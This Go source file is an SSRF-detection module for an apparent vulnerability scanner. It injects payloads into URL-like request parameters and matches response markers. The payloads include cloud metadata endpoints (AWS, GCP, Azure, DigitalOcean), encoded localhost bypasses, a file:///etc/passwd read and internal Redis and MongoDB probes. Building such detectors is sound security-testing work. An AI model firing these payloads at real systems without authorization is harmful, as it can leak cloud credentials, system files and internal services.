package ssrf_detection

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

// ssrfPayload defines a single SSRF test case.
type ssrfPayload struct {
	payload string
	markers []string // strings to look for in response body
	desc    string
}

var payloads = []ssrfPayload{
	{
		payload: "http://127.0.0.1",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via 127.0.0.1",
	},
	{
		payload: "http://[::1]",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via IPv6 loopback",
	},
	{
		payload: "http://169.254.169.254/latest/meta-data/",
		markers: []string{"ami-id", "instance-id", "local-hostname", "public-hostname"},
		desc:    "AWS EC2 metadata endpoint access",
	},
	{
		payload: "http://metadata.google.internal/computeMetadata/v1/",
		markers: []string{"attributes/", "project-id", "instance/"},
		desc:    "GCP metadata endpoint access",
	},
	{
		payload: "http://169.254.169.254/metadata/instance",
		markers: []string{"compute", "vmId", "vmSize"},
		desc:    "Azure metadata endpoint access",
	},
	// Encoding bypass payloads for localhost
	{
		payload: "http://0177.0.0.1",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via octal IP encoding",
	},
	{
		payload: "http://2130706433",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via decimal IP encoding",
	},
	{
		payload: "http://0x7f000001",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via hexadecimal IP encoding",
	},
	{
		payload: "http://[::ffff:127.0.0.1]",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via IPv6-mapped IPv4 address",
	},
	{
		payload: "http://127.1",
		markers: []string{"<html", "<!DOCTYPE", "root:", "localhost"},
		desc:    "Localhost access via shortened IP notation",
	},
	{
		payload: "file:///etc/passwd",
		markers: []string{"root:", "/bin/bash", "/bin/sh"},
		desc:    "Local file read via file:// protocol",
	},
	{
		payload: "http://169.254.169.254/metadata/v1/",
		markers: []string{"droplet_id", "hostname", "region"},
		desc:    "DigitalOcean metadata endpoint access",
	},
	{
		payload: "http://127.0.0.1:6379",
		markers: []string{"REDIS", "-ERR", "+PONG"},
		desc:    "Redis internal service probing",
	},
	{
		payload: "http://127.0.0.1:27017",
		markers: []string{"MongoDB", "ismaster", "It looks like you are"},
		desc:    "MongoDB internal service probing",
	},
}

// Module implements the SSRF detection active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new SSRF Detection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rhm: dedup.LazyDefaultRHM("ssrf_detection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint tests a single insertion point for SSRF.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Check if we should scan this insertion point
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	// Only test parameters that look like they might accept URLs
	baseVal := ip.BaseValue()
	if !looksLikeURLParam(ip.Name(), baseVal) {
		return nil, nil
	}

	var results []*output.ResultEvent

	// Get original response body for comparison
	var origBody string
	if ctx.Response() != nil {
		origBody = ctx.Response().BodyToString()
	}

	for _, p := range payloads {
		fuzzedRaw := ip.BuildRequest([]byte(p.payload))

		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		body := resp.Body().String()
		if matched := checkSSRFMarkers(body, origBody, p.markers); matched != "" {
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(fuzzedRaw),
				Response:         resp.FullResponse().String(),
				FuzzingParameter: ip.Name(),
				ExtractedResults: []string{p.payload, matched},
				Info: output.Info{
					Description: fmt.Sprintf("SSRF: %s — marker %q found in response", p.desc, matched),
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// looksLikeURLParam checks if a parameter name or value suggests URL input.
func looksLikeURLParam(name, value string) bool {
	nameLower := strings.ToLower(name)
	urlParamNames := []string{"url", "uri", "link", "src", "href", "dest", "redirect", "path", "file", "page", "target", "callback", "endpoint", "resource", "fetch", "load", "proxy", "request"}
	for _, n := range urlParamNames {
		if strings.Contains(nameLower, n) {
			return true
		}
	}
	if strings.HasPrefix(value, "http://") || strings.HasPrefix(value, "https://") || strings.HasPrefix(value, "//") {
		return true
	}
	return false
}

// checkSSRFMarkers checks if response body contains SSRF indicators not in original.
func checkSSRFMarkers(body, origBody string, markers []string) string {
	bodyLower := strings.ToLower(body)
	origLower := strings.ToLower(origBody)
	for _, marker := range markers {
		m := strings.ToLower(marker)
		if strings.Contains(bodyLower, m) && !strings.Contains(origLower, m) {
			return marker
		}
	}
	return ""
}
